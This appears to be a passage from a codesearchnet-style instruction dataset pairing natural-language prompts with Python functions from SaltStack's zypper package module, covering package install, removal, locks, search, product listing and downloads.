{\n            'old': {\n                'version': '<old-version>',\n                'arch': '<old-arch>'},\n\n            'new': {\n                'version': '<new-version>',\n                'arch': '<new-arch>'}}}\n    '''\n    if refresh:\n        refresh_db(root)\n\n    try:\n        pkg_params, pkg_type = __salt__['pkg_resource.parse_targets'](name, pkgs, sources, **kwargs)\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    if not pkg_params:\n        return {}\n\n    version_num = Wildcard(__zypper__(root=root))(name, version)\n\n    if version_num:\n        if pkgs is None and sources is None:\n            # Allow \"version\" to work for single package target\n            pkg_params = {name: version_num}\n        else:\n            log.warning('\"version\" parameter will be ignored for multiple '\n                        'package targets')\n\n    if pkg_type == 'repository':\n        targets = []\n        for param, version_num in six.iteritems(pkg_params):\n            if version_num is None:\n                log.debug('targeting package: %s', param)\n                targets.append(param)\n            else:\n                prefix, verstr = salt.utils.pkg.split_comparison(version_num)\n                if not prefix:\n                    prefix = '='\n                target = '{0}{1}{2}'.format(param, prefix, verstr)\n                log.debug('targeting package: %s', target)\n                targets.append(target)\n    elif pkg_type == 'advisory':\n        targets = []\n        cur_patches = list_patches(root=root)\n        for advisory_id in pkg_params:\n            if advisory_id not in cur_patches:\n                raise CommandExecutionError('Advisory id \"{0}\" not found'.format(advisory_id))\n            else:\n                targets.append('patch:{}'.format(advisory_id))\n    else:\n        targets = pkg_params\n\n    diff_attr = kwargs.get(\"diff_attr\")\n\n    includes = _find_types(targets)\n    old = list_pkgs(attr=diff_attr, root=root, includes=includes) if not downloadonly else list_downloaded(root)\n\n    downgrades = []\n    if fromrepo:\n        fromrepoopt = ['--force', '--force-resolution', '--from', fromrepo]\n        log.info('Targeting repo \\'%s\\'', fromrepo)\n    else:\n        fromrepoopt = ''\n    cmd_install = ['install', '--auto-agree-with-licenses']\n\n    cmd_install.append(kwargs.get('resolve_capabilities') and '--capability' or '--name')\n\n    if not refresh:\n        cmd_install.insert(0, '--no-refresh')\n    if skip_verify:\n        cmd_install.insert(0, '--no-gpg-checks')\n    if downloadonly:\n        cmd_install.append('--download-only')\n    if fromrepo:\n        cmd_install.extend(fromrepoopt)\n    if no_recommends:\n        cmd_install.append('--no-recommends')\n\n    errors = []\n\n    # Split the targets into batches of 500 packages each, so that\n    # the maximal length of the command line is not broken\n    systemd_scope = _systemd_scope()\n    while targets:\n        cmd = cmd_install + targets[:500]\n        targets = targets[500:]\n        for line in __zypper__(no_repo_failure=ignore_repo_failure, systemd_scope=systemd_scope, root=root).call(*cmd).splitlines():\n            match = re.match(r\"^The selected package '([^']+)'.+has lower version\", line)\n            if match:\n                downgrades.append(match.group(1))\n\n    while downgrades:\n        cmd = cmd_install + ['--force'] + downgrades[:500]\n        downgrades = downgrades[500:]\n        __zypper__(no_repo_failure=ignore_repo_failure, root=root).call(*cmd)\n\n    _clean_cache()\n    new = list_pkgs(attr=diff_attr, root=root, includes=includes) if not downloadonly else list_downloaded(root)\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    # If something else from packages are included in the search,\n    # better clean the cache.\n    if includes:\n        _clean_cache()\n\n    if errors:\n        raise CommandExecutionError(\n            'Problem encountered {0} package(s)'.format(\n                'downloading' if downloadonly else 'installing'\n            ),\n            info={'errors': errors, 'changes': ret}\n        )\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves and purge do identical things but with different Zypper commands", "response": "def _uninstall(name=None, pkgs=None, root=None):\n    '''\n    Remove and purge do identical things but with different Zypper commands,\n    this function performs the common logic.\n    '''\n    try:\n        pkg_params = __salt__['pkg_resource.parse_targets'](name, pkgs)[0]\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    includes = _find_types(pkg_params.keys())\n    old = list_pkgs(root=root, includes=includes)\n    targets = []\n    for target in pkg_params:\n        # Check if package version set to be removed is actually installed:\n        # old[target] contains a comma-separated list of installed versions\n        if target in old and pkg_params[target] in old[target].split(','):\n            targets.append(target + \"-\" + pkg_params[target])\n        elif target in old and not pkg_params[target]:\n            targets.append(target)\n    if not targets:\n        return {}\n\n    systemd_scope = _systemd_scope()\n\n    errors = []\n    while targets:\n        __zypper__(systemd_scope=systemd_scope, root=root).call('remove', *targets[:500])\n        targets = targets[500:]\n\n    _clean_cache()\n    new = list_pkgs(root=root, includes=includes)\n    ret = salt.utils.data.compare_dicts(old, new)\n\n    if errors:\n        raise CommandExecutionError(\n            'Problem encountered removing package(s)',\n            info={'errors': errors, 'changes': ret}\n        )\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nremoving packages from the named package.", "response": "def remove(name=None, pkgs=None, root=None, **kwargs):  # pylint: disable=unused-argument\n    '''\n    .. versionchanged:: 2015.8.12,2016.3.3,2016.11.0\n        On minions running systemd>=205, `systemd-run(1)`_ is now used to\n        isolate commands which modify installed packages from the\n        ``salt-minion`` daemon's control group. This is done to keep systemd\n        from killing any zypper commands spawned by Salt when the\n        ``salt-minion`` service is restarted. (see ``KillMode`` in the\n        `systemd.kill(5)`_ manpage for more information). If desired, usage of\n        `systemd-run(1)`_ can be suppressed by setting a :mod:`config option\n        <salt.modules.config.get>` called ``systemd.scope``, with a value of\n        ``False`` (no quotes).\n\n    .. _`systemd-run(1)`: https://www.freedesktop.org/software/systemd/man/systemd-run.html\n    .. _`systemd.kill(5)`: https://www.freedesktop.org/software/systemd/man/systemd.kill.html\n\n    Remove packages with ``zypper -n remove``\n\n    name\n        The name of the package to be deleted.\n\n\n    Multiple Package Options:\n\n    pkgs\n        A list of packages to delete. Must be passed as a python list. The\n        ``name`` parameter will be ignored if this option is passed.\n\n    root\n        Operate on a different root directory.\n\n    .. versionadded:: 0.16.0\n\n\n    Returns a dict containing the changes.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.remove <package name>\n        salt '*' pkg.remove <package1>,<package2>,<package3>\n        salt '*' pkg.remove pkgs='[\"foo\", \"bar\"]'\n    '''\n    return _uninstall(name=name, pkgs=pkgs, root=root)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove a package from the system.", "response": "def purge(name=None, pkgs=None, root=None, **kwargs):  # pylint: disable=unused-argument\n    '''\n    .. versionchanged:: 2015.8.12,2016.3.3,2016.11.0\n        On minions running systemd>=205, `systemd-run(1)`_ is now used to\n        isolate commands which modify installed packages from the\n        ``salt-minion`` daemon's control group. This is done to keep systemd\n        from killing any zypper commands spawned by Salt when the\n        ``salt-minion`` service is restarted. (see ``KillMode`` in the\n        `systemd.kill(5)`_ manpage for more information). If desired, usage of\n        `systemd-run(1)`_ can be suppressed by setting a :mod:`config option\n        <salt.modules.config.get>` called ``systemd.scope``, with a value of\n        ``False`` (no quotes).\n\n    .. _`systemd-run(1)`: https://www.freedesktop.org/software/systemd/man/systemd-run.html\n    .. _`systemd.kill(5)`: https://www.freedesktop.org/software/systemd/man/systemd.kill.html\n\n    Recursively remove a package and all dependencies which were installed\n    with it, this will call a ``zypper -n remove -u``\n\n    name\n        The name of the package to be deleted.\n\n\n    Multiple Package Options:\n\n    pkgs\n        A list of packages to delete. Must be passed as a python list. The\n        ``name`` parameter will be ignored if this option is passed.\n\n    root\n        Operate on a different root directory.\n\n    .. versionadded:: 0.16.0\n\n\n    Returns a dict containing the changes.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.purge <package name>\n        salt '*' pkg.purge <package1>,<package2>,<package3>\n        salt '*' pkg.purge pkgs='[\"foo\", \"bar\"]'\n    '''\n    return _uninstall(name=name, pkgs=pkgs, root=root)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nlist all current locks.", "response": "def list_locks(root=None):\n    '''\n    List current package locks.\n\n    root\n        operate on a different root directory.\n\n    Return a dict containing the locked package with attributes::\n\n        {'<package>': {'case_sensitive': '<case_sensitive>',\n                       'match_type': '<match_type>'\n                       'type': '<type>'}}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_locks\n    '''\n    locks = {}\n    _locks = os.path.join(root, os.path.relpath(LOCKS, os.path.sep)) if root else LOCKS\n    try:\n        with salt.utils.files.fopen(_locks) as fhr:\n            items = salt.utils.stringutils.to_unicode(fhr.read()).split('\\n\\n')\n            for meta in [item.split('\\n') for item in items]:\n                lock = {}\n                for element in [el for el in meta if el]:\n                    if ':' in element:\n                        lock.update(dict([tuple([i.strip() for i in element.split(':', 1)]), ]))\n                if lock.get('solvable_name'):\n                    locks[lock.pop('solvable_name')] = lock\n    except IOError:\n        pass\n    except Exception:\n        log.warning('Detected a problem when accessing %s', _locks)\n\n    return locks"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef clean_locks(root=None):\n    '''\n    Remove unused locks that do not currently (with regard to repositories\n    used) lock any package.\n\n    root\n        Operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.clean_locks\n    '''\n    LCK = \"removed\"\n    out = {LCK: 0}\n    locks = os.path.join(root, os.path.relpath(LOCKS, os.path.sep)) if root else LOCKS\n    if not os.path.exists(locks):\n        return out\n\n    for node in __zypper__(root=root).xml.call('cl').getElementsByTagName(\"message\"):\n        text = node.childNodes[0].nodeValue.lower()\n        if text.startswith(LCK):\n            out[LCK] = text.split(\" \")[1]\n            break\n\n    return out", "response": "Remove unused locks that do not currently lock any package."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef unhold(name=None, pkgs=None, **kwargs):\n    '''\n    Remove specified package lock.\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.remove_lock <package name>\n        salt '*' pkg.remove_lock <package1>,<package2>,<package3>\n        salt '*' pkg.remove_lock pkgs='[\"foo\", \"bar\"]'\n    '''\n    ret = {}\n    root = kwargs.get('root')\n    if (not name and not pkgs) or (name and pkgs):\n        raise CommandExecutionError('Name or packages must be specified.')\n    elif name:\n        pkgs = [name]\n\n    locks = list_locks(root)\n    try:\n        pkgs = list(__salt__['pkg_resource.parse_targets'](pkgs)[0].keys())\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    removed = []\n    missing = []\n    for pkg in pkgs:\n        if locks.get(pkg):\n            removed.append(pkg)\n            ret[pkg]['comment'] = 'Package {0} is no longer held.'.format(pkg)\n        else:\n            missing.append(pkg)\n            ret[pkg]['comment'] = 'Package {0} unable to be unheld.'.format(pkg)\n\n    if removed:\n        __zypper__(root=root).call('rl', *removed)\n\n    return ret", "response": "Remove specified package lock."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef remove_lock(packages, root=None, **kwargs):  # pylint: disable=unused-argument\n    '''\n    Remove specified package lock.\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.remove_lock <package name>\n        salt '*' pkg.remove_lock <package1>,<package2>,<package3>\n        salt '*' pkg.remove_lock pkgs='[\"foo\", \"bar\"]'\n    '''\n    salt.utils.versions.warn_until('Sodium', 'This function is deprecated. Please use unhold() instead.')\n    locks = list_locks(root)\n    try:\n        packages = list(__salt__['pkg_resource.parse_targets'](packages)[0].keys())\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    removed = []\n    missing = []\n    for pkg in packages:\n        if locks.get(pkg):\n            removed.append(pkg)\n        else:\n            missing.append(pkg)\n\n    if removed:\n        __zypper__(root=root).call('rl', *removed)\n\n    return {'removed': len(removed), 'not_found': missing}", "response": "Remove specified package lock."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds a package lock to the root directory.", "response": "def hold(name=None, pkgs=None, **kwargs):\n    '''\n    Add a package lock. Specify packages to lock by exact name.\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.add_lock <package name>\n        salt '*' pkg.add_lock <package1>,<package2>,<package3>\n        salt '*' pkg.add_lock pkgs='[\"foo\", \"bar\"]'\n\n    :param name:\n    :param pkgs:\n    :param kwargs:\n    :return:\n    '''\n    ret = {}\n    root = kwargs.get('root')\n    if (not name and not pkgs) or (name and pkgs):\n        raise CommandExecutionError('Name or packages must be specified.')\n    elif name:\n        pkgs = [name]\n\n    locks = list_locks(root=root)\n    added = []\n    try:\n        pkgs = list(__salt__['pkg_resource.parse_targets'](pkgs)[0].keys())\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    for pkg in pkgs:\n        ret[pkg] = {'name': pkg, 'changes': {}, 'result': False, 'comment': ''}\n        if not locks.get(pkg):\n            added.append(pkg)\n            ret[pkg]['comment'] = 'Package {0} is now being held.'.format(pkg)\n        else:\n            ret[pkg]['comment'] = 'Package {0} is already set to be held.'.format(pkg)\n\n    if added:\n        __zypper__(root=root).call('al', *added)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd a lock to a set of packages.", "response": "def add_lock(packages, root=None, **kwargs):  # pylint: disable=unused-argument\n    '''\n    Add a package lock. Specify packages to lock by exact name.\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.add_lock <package name>\n        salt '*' pkg.add_lock <package1>,<package2>,<package3>\n        salt '*' pkg.add_lock pkgs='[\"foo\", \"bar\"]'\n    '''\n    salt.utils.versions.warn_until('Sodium', 'This function is deprecated. Please use hold() instead.')\n    locks = list_locks(root)\n    added = []\n    try:\n        packages = list(__salt__['pkg_resource.parse_targets'](packages)[0].keys())\n    except MinionError as exc:\n        raise CommandExecutionError(exc)\n\n    for pkg in packages:\n        if not locks.get(pkg):\n            added.append(pkg)\n\n    if added:\n        __zypper__(root=root).call('al', *added)\n\n    return {'added': len(added), 'packages': added}"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_patterns(installed_only=None, root=None):\n    '''\n    List all known patterns in repos.\n    '''\n    patterns = {}\n    for element in __zypper__(root=root).nolock.xml.call('se', '-t', 'pattern').getElementsByTagName('solvable'):\n        installed = element.getAttribute('status') == 'installed'\n        if (installed_only and installed) or not installed_only:\n            patterns[element.getAttribute('name')] = {\n                'installed': installed,\n                'summary': element.getAttribute('summary'),\n            }\n\n    return patterns", "response": "Get all known patterns in repos."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nlists all known patterns from available repos.", "response": "def list_patterns(refresh=False, root=None):\n    '''\n    List all known patterns from available repos.\n\n    refresh\n        force a refresh if set to True.\n        If set to False (default) it depends on zypper if a refresh is\n        executed.\n\n    root\n        operate on a different root directory.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_patterns\n    '''\n    if refresh:\n        refresh_db(root)\n\n    return _get_patterns(root=root)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsearch for known packages in the system.", "response": "def search(criteria, refresh=False, **kwargs):\n    '''\n    List known packages, available to the system.\n\n    refresh\n        force a refresh if set to True.\n        If set to False (default) it depends on zypper if a refresh is\n        executed.\n\n    match (str)\n        One of `exact`, `words`, `substrings`. Search for an `exact` match\n        or for the whole `words` only. Default to `substrings` to patch\n        partial words.\n\n    provides (bool)\n        Search for packages which provide the search strings.\n\n    recommends (bool)\n        Search for packages which recommend the search strings.\n\n    requires (bool)\n        Search for packages which require the search strings.\n\n    suggests (bool)\n        Search for packages which suggest the search strings.\n\n    conflicts (bool)\n        Search packages conflicting with search strings.\n\n    obsoletes (bool)\n        Search for packages which obsolete the search strings.\n\n    file_list (bool)\n        Search for a match in the file list of packages.\n\n    search_descriptions (bool)\n        Search also in package summaries and descriptions.\n\n    case_sensitive (bool)\n        Perform case-sensitive search.\n\n    installed_only (bool)\n        Show only installed packages.\n\n    not_installed_only (bool)\n        Show only packages which are not installed.\n\n    details (bool)\n        Show version and repository\n\n    root\n        operate on a different root directory.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.search <criteria>\n    '''\n    ALLOWED_SEARCH_OPTIONS = {\n            'provides': '--provides',\n            'recommends': '--recommends',\n            'requires': '--requires',\n            'suggests': '--suggests',\n            'conflicts': '--conflicts',\n            'obsoletes': '--obsoletes',\n            'file_list': '--file-list',\n            'search_descriptions': '--search-descriptions',\n            'case_sensitive': '--case-sensitive',\n            'installed_only': '--installed-only',\n            'not_installed_only': '-u',\n            'details': '--details'\n            }\n\n    root = kwargs.get('root', None)\n\n    if refresh:\n        refresh_db(root)\n\n    cmd = ['search']\n    if kwargs.get('match') == 'exact':\n        cmd.append('--match-exact')\n    elif kwargs.get('match') == 'words':\n        cmd.append('--match-words')\n    elif kwargs.get('match') == 'substrings':\n        cmd.append('--match-substrings')\n\n    for opt in kwargs:\n        if opt in ALLOWED_SEARCH_OPTIONS:\n            cmd.append(ALLOWED_SEARCH_OPTIONS.get(opt))\n\n    cmd.append(criteria)\n    solvables = __zypper__(root=root).nolock.noraise.xml.call(*cmd).getElementsByTagName('solvable')\n    if not solvables:\n        raise CommandExecutionError(\n            'No packages found matching \\'{0}\\''.format(criteria)\n        )\n\n    out = {}\n    for solvable in solvables:\n        out[solvable.getAttribute('name')] = dict()\n        for k, v in solvable.attributes.items():\n            out[solvable.getAttribute('name')][k] = v\n\n    return out"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_first_aggregate_text(node_list):\n    '''\n    Extract text from the first occurred DOM aggregate.\n    '''\n    if not node_list:\n        return ''\n\n    out = []\n    for node in node_list[0].childNodes:\n        if node.nodeType == dom.Document.TEXT_NODE:\n            out.append(node.nodeValue)\n    return '\\n'.join(out)", "response": "Extract text from the first occurred DOM aggregate."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list_products(all=False, refresh=False, root=None):\n    '''\n    List all available or installed SUSE products.\n\n    all\n        List all products available or only installed. Default is False.\n\n    refresh\n        force a refresh if set to True.\n        If set to False (default) it depends on zypper if a refresh is\n        executed.\n\n    root\n        operate on a different root directory.\n\n    Includes handling for OEM products, which read the OEM productline file\n    and overwrite the release value.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_products\n        salt '*' pkg.list_products all=True\n    '''\n    if refresh:\n        refresh_db(root)\n\n    ret = list()\n    OEM_PATH = '/var/lib/suseRegister/OEM'\n    if root:\n        OEM_PATH = os.path.join(root, os.path.relpath(OEM_PATH, os.path.sep))\n    cmd = list()\n    if not all:\n        cmd.append('--disable-repos')\n    cmd.append('products')\n    if not all:\n        cmd.append('-i')\n\n    product_list = __zypper__(root=root).nolock.xml.call(*cmd).getElementsByTagName('product-list')\n    if not product_list:\n        return ret  # No products found\n\n    for prd in product_list[0].getElementsByTagName('product'):\n        p_nfo = dict()\n        for k_p_nfo, v_p_nfo in prd.attributes.items():\n            if k_p_nfo in ['isbase', 'installed']:\n                p_nfo[k_p_nfo] = bool(v_p_nfo in ['true', '1'])\n            elif v_p_nfo:\n                p_nfo[k_p_nfo] = v_p_nfo\n\n        eol = prd.getElementsByTagName('endoflife')\n        if eol:\n            p_nfo['eol'] = eol[0].getAttribute('text')\n            p_nfo['eol_t'] = int(eol[0].getAttribute('time_t') or 0)\n        p_nfo['description'] = \" \".join(\n            [line.strip() for line in _get_first_aggregate_text(\n                prd.getElementsByTagName('description')\n            ).split(os.linesep)]\n        )\n        if 'productline' in p_nfo and p_nfo['productline']:\n            oem_file = os.path.join(OEM_PATH, p_nfo['productline'])\n            if os.path.isfile(oem_file):\n                with salt.utils.files.fopen(oem_file, 'r') as rfile:\n                    oem_release = salt.utils.stringutils.to_unicode(rfile.readline()).strip()\n                    if oem_release:\n                        p_nfo['release'] = oem_release\n        ret.append(p_nfo)\n\n    return ret", "response": "List available or only installed SUSE products."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef download(*packages, **kwargs):\n    '''\n    Download packages to the local disk.\n\n    refresh\n        force a refresh if set to True.\n        If set to False (default) it depends on zypper if a refresh is\n        executed.\n\n    root\n        operate on a different root directory.\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.download httpd\n        salt '*' pkg.download httpd postfix\n    '''\n    if not packages:\n        raise SaltInvocationError('No packages specified')\n\n    root = kwargs.get('root', None)\n\n    refresh = kwargs.get('refresh', False)\n    if refresh:\n        refresh_db(root)\n\n    pkg_ret = {}\n    for dld_result in __zypper__(root=root).xml.call('download', *packages).getElementsByTagName(\"download-result\"):\n        repo = dld_result.getElementsByTagName(\"repository\")[0]\n        path = dld_result.getElementsByTagName(\"localfile\")[0].getAttribute(\"path\")\n        pkg_info = {\n            'repository-name': repo.getAttribute('name'),\n            'repository-alias': repo.getAttribute('alias'),\n            'path': path,\n        }\n        key = _get_first_aggregate_text(\n            dld_result.getElementsByTagName('name')\n        )\n        if __salt__['lowpkg.checksum'](pkg_info['path'], root=root):\n            pkg_ret[key] = pkg_info\n\n    if pkg_ret:\n        failed = [pkg for pkg in packages if pkg not in pkg_ret]\n        if failed:\n            pkg_ret['_error'] = ('The following package(s) failed to download: {0}'.format(', '.join(failed)))\n        return pkg_ret\n\n    raise CommandExecutionError(\n        'Unable to download packages: {0}'.format(', '.join(packages))\n    )", "response": "Download packages to the local disk."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_patches(installed_only=False, root=None):\n    '''\n    List all known patches in repos.\n    '''\n    patches = {}\n    for element in __zypper__(root=root).nolock.xml.call('se', '-t', 'patch').getElementsByTagName('solvable'):\n        installed = element.getAttribute('status') == 'installed'\n        if (installed_only and installed) or not installed_only:\n            patches[element.getAttribute('name')] = {\n                'installed': installed,\n                'summary': element.getAttribute('summary'),\n            }\n\n    return patches", "response": "Get all known patches in repos."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nlists all known advisory patches from available repos.", "response": "def list_patches(refresh=False, root=None, **kwargs):\n    '''\n    .. versionadded:: 2017.7.0\n\n    List all known advisory patches from available repos.\n\n    refresh\n        force a refresh if set to True.\n        If set to False (default) it depends on zypper if a refresh is\n        executed.\n\n    root\n        operate on a different root directory.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_patches\n    '''\n    if refresh:\n        refresh_db(root)\n\n    return _get_patches(root=root)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nlist packages provides by installed packages.", "response": "def list_provides(root=None, **kwargs):\n    '''\n    .. versionadded:: 2018.3.0\n\n    List package provides of installed packages as a dict.\n    {'<provided_name>': ['<package_name>', '<package_name>', ...]}\n\n    root\n        operate on a different root directory.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_provides\n    '''\n    ret = __context__.get('pkg.list_provides')\n    if not ret:\n        cmd = ['rpm']\n        if root:\n            cmd.extend(['--root', root])\n        cmd.extend(['-qa', '--queryformat', '%{PROVIDES}_|-%{NAME}\\n'])\n        ret = dict()\n        for line in __salt__['cmd.run'](cmd, output_loglevel='trace', python_shell=False).splitlines():\n            provide, realname = line.split('_|-')\n\n            if provide == realname:\n                continue\n            if provide not in ret:\n                ret[provide] = list()\n            ret[provide].append(realname)\n\n        __context__['pkg.list_provides'] = ret\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nresetting the values of the call setup.", "response": "def _reset(self):\n        '''\n        Resets values of the call setup.\n\n        :return:\n        '''\n        self.__cmd = ['zypper', '--non-interactive']\n        self.__exit_code = 0\n        self.__call_result = dict()\n        self.__error_msg = ''\n        self.__env = salt.utils.environment.get_module_environment(globals())\n\n        # Call config\n        self.__xml = False\n        self.__no_lock = False\n        self.__no_raise = False\n        self.__refresh = False\n        self.__ignore_repo_failure = False\n        self.__systemd_scope = False\n        self.__root = None\n\n        # Call status\n        self.__called = False"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _is_error(self):\n        '''\n        Is this is an error code?\n\n        :return:\n        '''\n        if self.exit_code:\n            msg = self.SUCCESS_EXIT_CODES.get(self.exit_code)\n            if msg:\n                log.info(msg)\n            msg = self.WARNING_EXIT_CODES.get(self.exit_code)\n            if msg:\n                log.warning(msg)\n\n        return self.exit_code not in self.SUCCESS_EXIT_CODES and self.exit_code not in self.WARNING_EXIT_CODES", "response": "Is this is an error code?"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _is_xml_mode(self):\n        '''\n        Is Zypper's output is in XML format?\n\n        :return:\n        '''\n        return [itm for itm in self.XML_DIRECTIVES if itm in self.__cmd] and True or False", "response": "Is Zypper s output is in XML format?"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck and set the result of a zypper command. In case of an error extract the error.", "response": "def _check_result(self):\n        '''\n        Check and set the result of a zypper command. In case of an error,\n        either raise a CommandExecutionError or extract the error.\n\n        result\n            The result of a zypper command called with cmd.run_all\n        '''\n        if not self.__call_result:\n            raise CommandExecutionError('No output result from Zypper?')\n\n        self.exit_code = self.__call_result['retcode']\n        if self._is_lock():\n            return False\n\n        if self._is_error():\n            _error_msg = list()\n            if not self._is_xml_mode():\n                msg = self.__call_result['stderr'] and self.__call_result['stderr'].strip() or \"\"\n                if msg:\n                    _error_msg.append(msg)\n            else:\n                try:\n                    doc = dom.parseString(self.__call_result['stdout'])\n                except ExpatError as err:\n                    log.error(err)\n                    doc = None\n                if doc:\n                    msg_nodes = doc.getElementsByTagName('message')\n                    for node in msg_nodes:\n                        if node.getAttribute('type') == 'error':\n                            _error_msg.append(node.childNodes[0].nodeValue)\n                elif self.__call_result['stderr'].strip():\n                    _error_msg.append(self.__call_result['stderr'].strip())\n            self.error_msg = _error_msg\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncall Zypper. :param state: :return:", "response": "def __call(self, *args, **kwargs):\n        '''\n        Call Zypper.\n\n        :param state:\n        :return:\n        '''\n        self.__called = True\n        if self.__xml:\n            self.__cmd.append('--xmlout')\n        if not self.__refresh and '--no-refresh' not in args:\n            self.__cmd.append('--no-refresh')\n        if self.__root:\n            self.__cmd.extend(['--root', self.__root])\n\n        self.__cmd.extend(args)\n        kwargs['output_loglevel'] = 'trace'\n        kwargs['python_shell'] = False\n        kwargs['env'] = self.__env.copy()\n        if self.__no_lock:\n            kwargs['env']['ZYPP_READONLY_HACK'] = \"1\"  # Disables locking for read-only operations. Do not try that at home!\n\n        # Zypper call will stuck here waiting, if another zypper hangs until forever.\n        # However, Zypper lock needs to be always respected.\n        was_blocked = False\n        while True:\n            cmd = []\n            if self.__systemd_scope:\n                cmd.extend(['systemd-run', '--scope'])\n            cmd.extend(self.__cmd)\n            log.debug('Calling Zypper: %s', ' '.join(cmd))\n            self.__call_result = __salt__['cmd.run_all'](cmd, **kwargs)\n            if self._check_result():\n                break\n\n            if os.path.exists(self.ZYPPER_LOCK):\n                try:\n                    with salt.utils.files.fopen(self.ZYPPER_LOCK) as rfh:\n                        data = __salt__['ps.proc_info'](int(rfh.readline()),\n                                                        attrs=['pid', 'name', 'cmdline', 'create_time'])\n                        data['cmdline'] = ' '.join(data['cmdline'])\n                        data['info'] = 'Blocking process created at {0}.'.format(\n                            datetime.datetime.utcfromtimestamp(data['create_time']).isoformat())\n                        data['success'] = True\n                except Exception as err:\n                    data = {'info': 'Unable to retrieve information about blocking process: {0}'.format(err.message),\n                            'success': False}\n            else:\n                data = {'info': 'Zypper is locked, but no Zypper lock has been found.', 'success': False}\n\n            if not data['success']:\n                log.debug(\"Unable to collect data about blocking process.\")\n            else:\n                log.debug(\"Collected data about blocking process.\")\n\n            __salt__['event.fire_master'](data, self.TAG_BLOCKED)\n            log.debug(\"Fired a Zypper blocked event to the master with the data: %s\", data)\n            log.debug(\"Waiting 5 seconds for Zypper gets released...\")\n            time.sleep(5)\n            if not was_blocked:\n                was_blocked = True\n\n        if was_blocked:\n            __salt__['event.fire_master']({'success': not self.error_msg,\n                                           'info': self.error_msg or 'Zypper has been released'},\n                                          self.TAG_RELEASED)\n        if self.error_msg and not self.__no_raise and not self.__ignore_repo_failure:\n            raise CommandExecutionError('Zypper command failure: {0}'.format(self.error_msg))\n\n        return (\n            self._is_xml_mode() and\n            dom.parseString(salt.utils.stringutils.to_str(self.__call_result['stdout'])) or\n            self.__call_result['stdout']\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget available versions of the package.", "response": "def _get_available_versions(self):\n        '''\n        Get available versions of the package.\n        :return:\n        '''\n        solvables = self.zypper.nolock.xml.call('se', '-xv', self.name).getElementsByTagName('solvable')\n        if not solvables:\n            raise CommandExecutionError('No packages found matching \\'{0}\\''.format(self.name))\n\n        return sorted(set([slv.getAttribute(self._attr_solvable_version)\n                           for slv in solvables if slv.getAttribute(self._attr_solvable_version)]))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_scope_versions(self, pkg_versions):\n        '''\n        Get available difference between next possible matches.\n\n        :return:\n        '''\n        get_in_versions = []\n        for p_version in pkg_versions:\n            if fnmatch.fnmatch(p_version, self.version):\n                get_in_versions.append(p_version)\n        return get_in_versions", "response": "Get available difference between next possible matches."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nset the version of the zypper object.", "response": "def _set_version(self, version):\n        '''\n        Stash operator from the version, if any.\n\n        :return:\n        '''\n        if not version:\n            return\n\n        exact_version = re.sub(r'[<>=+]*', '', version)\n        self._op = version.replace(exact_version, '') or None\n        if self._op and self._op not in self.Z_OP:\n            raise CommandExecutionError('Zypper do not supports operator \"{0}\".'.format(self._op))\n        self.version = exact_version"}
